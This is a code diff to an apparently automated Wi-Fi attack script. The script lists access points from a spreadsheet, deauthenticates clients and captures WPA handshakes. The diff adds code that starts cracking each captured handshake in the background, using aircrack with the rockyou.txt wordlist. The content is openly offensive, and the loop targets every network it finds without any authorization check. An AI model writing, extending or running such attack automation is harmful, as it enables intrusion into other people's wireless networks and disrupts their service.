@@ -4,6 +4,8 @@ from dump import Dump
 import threading
 from openpyxl import load_workbook
 from replay import capture_handshake, deauth_attack
+from crack import AircrackWrapper
+import os
 
 ifs = Interface()
 #select interfaces
@@ -36,6 +38,8 @@ d.enumAPs(interface = active_interface)
 wb = load_workbook("wifi_scan.xlsx")
 ws = wb["Access_Points"]
 
+ROCKYOU = "/usr/share/wordlists/rockyou.txt"
+
 for row in ws.iter_rows(min_row=2, values_only=True):
     if not row or not row[0] or "BSSID" in str(row[0]):
         continue
@@ -58,6 +62,19 @@ for row in ws.iter_rows(min_row=2, values_only=True):
         stop_event=stop_event,  # allows capture to stop when deauth finishes
         timeout=duration        # ensure capture also stops after duration if no handshake
     )
+
+    # If a handshake was captured, start cracking immediately in background
+    if cap_file:
+        # ensure rockyou exists
+        if os.path.exists(ROCKYOU):
+            aw = AircrackWrapper(cap_file, [ROCKYOU])
+            cracker_thread = threading.Thread(target=aw.run_and_save, args=(ROCKYOU,))
+            cracker_thread.daemon = True
+            cracker_thread.start()
+            print("[*] Cracking started in background with rockyou.txt")
+        else:
+            print(f"[!] Wordlist not found: {ROCKYOU}. Skipping immediate cracking.")
+
     deauth_thread.join()
     print(f"[*] Finished with {ssid} ({bssid})")
 
